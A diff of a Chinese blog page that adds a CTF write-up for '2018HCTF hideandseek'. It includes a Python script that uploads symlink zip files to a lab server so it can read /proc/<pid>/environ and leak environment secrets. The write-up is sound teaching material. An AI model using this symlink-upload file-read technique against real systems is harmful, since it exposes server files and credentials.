@@ -358,21 +358,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:
-                    2021-03-19
+                    2021-03-20
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:
-                    3.7k
+                    4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:
-                    16 分
+                    18 分
                 </div>
                 
 
@@ -836,6 +836,37 @@ files <span class="token operator">=</span> os<span class="token punctuation">.<
 <li><strong>GET+POST</strong>:<code>GET:yds=flag  POST:$flag=flag</code></li>
 </ol>
 <p>OK! 干饭去了</p>
+<h2 id="2018HCTF-hideandseek"><a href="#2018HCTF-hideandseek" class="headerlink" title="2018HCTF hideandseek"></a>2018HCTF hideandseek</h2><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210319222725626.png"></p>
+<p>开局要登录，准备用admin去试几个密码，结果发现不可行</p>
+<p>随便输个账号密码也能登进去（应该没有数据库，而是靠cookie或者是session来判断的），接下来就是文件上传了，提示只能上传zip</p>
+<p>上传zip后应该会被解压，然后返回里面的内容？</p>
+<p>试了一下果然可以，在WSL创建一个软链接，然后把它压缩成zip传上去</p>
+<p>上脚本直接查看进程运行时的环境变量看看有什么可用的信息</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
+<span class="token keyword">import</span> requests
+
+<span class="token keyword">def</span> <span class="token function">createlink</span><span class="token punctuation">(</span>linkway<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ln -s %s link'</span> <span class="token operator">%</span> linkway<span class="token punctuation">)</span>
+    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'zip -y -m test.zip link'</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">uploadfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    url <span class="token operator">=</span> <span class="token string">'http://38994068-7739-4c46-8e5a-4861ae8a3e86.node3.buuoj.cn/upload'</span>
+    files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'the_file'</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.zip'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
+    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'submit'</span><span class="token punctuation">:</span> <span class="token string">'Submit'</span><span class="token punctuation">&#125;</span>
+    a <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    linkway <span class="token operator">=</span> <span class="token string">'/proc/%d/environ'</span><span class="token operator">%</span>i
+    createlink<span class="token punctuation">(</span>linkway<span class="token punctuation">)</span>
+    uploadfile<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210319225011841.png"></p>
+<p>直接就爆出来了。。。我感觉正常应该要伪造个cookie或者是session登入admin才能拿到flag的</p>
+<p>看了一下网上一些人的做法，还是构造软链接去读取有用的信息</p>
+<p>还是要去<code>/proc/self/environ</code>查看环境变量列表</p>
 
                 
             </div>
@@ -1216,7 +1247,7 @@ files <span class="token operator">=</span> os<span class="token punctuation">.<
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">42.5k</span>&nbsp;字
+                class="white-color">42.8k</span>&nbsp;字
             
             
             
